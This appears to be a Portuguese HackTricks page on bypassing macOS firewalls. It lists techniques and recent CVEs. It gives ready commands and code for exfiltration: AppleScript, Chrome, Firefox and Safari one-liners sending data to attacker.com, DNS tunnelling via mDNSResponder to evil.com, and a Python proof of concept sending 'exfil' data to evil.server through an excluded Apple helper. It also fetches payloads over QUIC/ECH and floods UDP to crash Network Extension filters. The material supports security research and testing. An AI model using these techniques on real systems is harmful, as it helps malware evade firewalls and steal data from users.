# Bypass de Firewalls no macOS

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

As técnicas a seguir foram encontradas funcionando em alguns apps de firewall do macOS.

### Abusando de nomes da whitelist

- Por exemplo, nomeando o malware com nomes de processos conhecidos do macOS, como **`launchd`**

### Synthetic Click

- Se o firewall solicitar permissão ao usuário, faça o malware **clicar em permitir**

### **Usar binários assinados pela Apple**

- Como o **`curl`**, mas também outros, como **`whois`**

### Domínios conhecidos da Apple

O firewall pode estar permitindo conexões com domínios conhecidos da Apple, como **`apple.com`** ou **`icloud.com`**. O iCloud também poderia ser usado como C2.

### Bypass genérico

Algumas ideias para tentar fazer bypass de firewalls

### Verificar o tráfego permitido

Conhecer o tráfego permitido ajudará você a identificar domínios potencialmente presentes na whitelist ou quais aplicações têm permissão para acessá-los
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

No macOS, um processo **não** se comunica diretamente com o servidor DNS. A resolução de nomes é intermediada via **XPC** pelo **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), um daemon do sistema assinado pela Apple; portanto, toda consulta realizada na máquina sai do host como tráfego **proveniente do `mDNSResponder`**, em vez do processo que a solicitou. Por isso, os firewalls tendem a confiar incondicionalmente nesse daemon — bloqueá-lo interromperia a resolução de nomes de todo o sistema.<sup>[[1]](#references)</sup>

Isso transforma o DNS em um canal que permanece aberto mesmo quando o firewall bloqueia os próprios sockets do malware:<sup>[[1]](#references)</sup>

1. O malware tenta se conectar a `evil.com`. A conexão de saída **própria** é examinada pelo firewall e **bloqueada**.
2. Em vez disso, o malware solicita ao `mDNSResponder` que **resolva** `evil.com`, via XPC.
3. O firewall examina a consulta, identifica o resolver confiável assinado pela Apple como originador e **permite** a consulta.
4. A consulta chega ao servidor DNS — e, se o atacante executar o servidor authoritative de `evil.com`, ele controlará ambas as extremidades da troca.

Como o atacante possui essa zone, nenhuma "conexão" é necessária: os dados são exfiltrados dentro dos **labels consultados** (por exemplo, `<encoded-chunk>.evil.com`) e os comandos retornam dentro dos **registros de resposta** (TXT, A, CNAME…), o que constitui um DNS tunnelling clássico utilizando um processo totalmente permitido pela whitelist.

Qualquer processo sem privilégios pode interagir diretamente com o daemon, sendo essa uma maneira fácil de confirmar que o caminho está aberto:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Via aplicativos do navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Se você puder **inject code into a process** que tenha permissão para se conectar a qualquer servidor, poderá contornar as proteções do firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recentes de bypass do firewall do macOS (2023-2025)

### Bypass do Web content filter (Screen Time) – **CVE-2024-44206**
Em julho de 2024, a Apple corrigiu um bug crítico no Safari/WebKit que comprometia o “Web content filter” em todo o sistema, usado pelos controles parentais do Screen Time.
Uma URI especialmente criada (por exemplo, com “://” codificado duas vezes na URL) não é reconhecida pela ACL do Screen Time, mas é aceita pelo WebKit; assim, a solicitação é enviada sem filtragem. Portanto, qualquer processo que possa abrir uma URL (incluindo código em sandbox ou não assinado) pode acessar domínios explicitamente bloqueados pelo usuário ou por um perfil MDM.<sup>[[2]](#references)</sup>

Teste prático (sistema sem patch):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug de ordenação de regras do Packet Filter (PF) nas primeiras versões do macOS 14 “Sonoma”
Durante o ciclo beta do macOS 14, a Apple introduziu uma regressão no wrapper de userspace em torno do **`pfctl`**.
As regras adicionadas com a keyword `quick` (usada por muitos kill-switches de VPN) eram silenciosamente ignoradas, causando traffic leaks mesmo quando uma interface gráfica de VPN/firewall informava que o tráfego estava *blocked*. O bug foi confirmado por vários fornecedores de VPN e corrigido na RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Verificação rápida de leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusando de helper services assinados pela Apple (legacy – anterior ao macOS 11.2)
Antes do macOS 11.2, a **`ContentFilterExclusionList`** permitia que cerca de 50 binários da Apple, como **`nsurlsessiond`** e a App Store, bypassassem todos os socket-filter firewalls implementados com o framework Network Extension (LuLu, Little Snitch etc.).
O malware podia simplesmente iniciar um processo excluído — ou fazer code injection nele — e tunelar seu próprio tráfego pelo socket já permitido. A Apple removeu completamente a exclusion list no macOS 11.2, mas a técnica ainda é relevante em sistemas que não podem ser atualizados.<sup>[[3]](#references)</sup>

Exemplo de proof-of-concept (anterior à 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH para contornar filtros de domínio do Network Extension (macOS 12+)
Os Packet/Data Providers do NEFilter usam o SNI/ALPN do TLS ClientHello como referência. Com **HTTP/3 sobre QUIC (UDP/443)** e **Encrypted Client Hello (ECH)**, o SNI permanece criptografado, o NetExt não consegue analisar o fluxo, e as regras de hostname frequentemente operam em fail-open, permitindo que malware alcance domínios bloqueados sem acessar o DNS.<sup>[[5]](#references)</sup>

PoC mínimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH ainda estiver habilitado, este é um caminho fácil para a evasão do filtro de hostname.

### Instabilidade do Network Extension no macOS 15 “Sequoia” (2024–2025)
As primeiras builds 15.0/15.1 causam o crash de filtros de **Network Extension** de terceiros (LuLu, Little Snitch, Defender, SentinelOne etc.). Quando o filtro reinicia, o macOS descarta suas regras de fluxo, e muitos produtos entram em fail-open. Inundar o filtro com milhares de fluxos UDP curtos (ou forçar QUIC/ECH) pode acionar repetidamente o crash e deixar uma janela para C2/exfil, enquanto a GUI ainda afirma que o firewall está em execução.<sup>[[4]](#references)</sup>

Reprodução rápida (caixa de laboratório segura):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Dicas de ferramentas para macOS moderno

1. Inspecione as regras PF atuais geradas por firewalls com GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumere os binários que já possuem o *outgoing-network* entitlement (útil para fazer piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registre programaticamente seu próprio filtro de conteúdo do Network Extension em Objective-C/Swift.
Um PoC rootless mínimo que encaminha pacotes para um socket local está disponível no código-fonte do **LuLu**, de Patrick Wardle.

## Referências

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Criando e quebrando firewalls do macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [O bypass do filtro de conteúdo web da Apple permite acesso irrestrito a conteúdo bloqueado (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple remove recurso do macOS que permitia que apps ignorassem a segurança do firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Produtos de cybersecurity param de funcionar após a atualização para macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use a proteção de rede para ajudar a impedir conexões do macOS com sites maliciosos - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [Bug do firewall do macOS 14 Sonoma corrigido! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
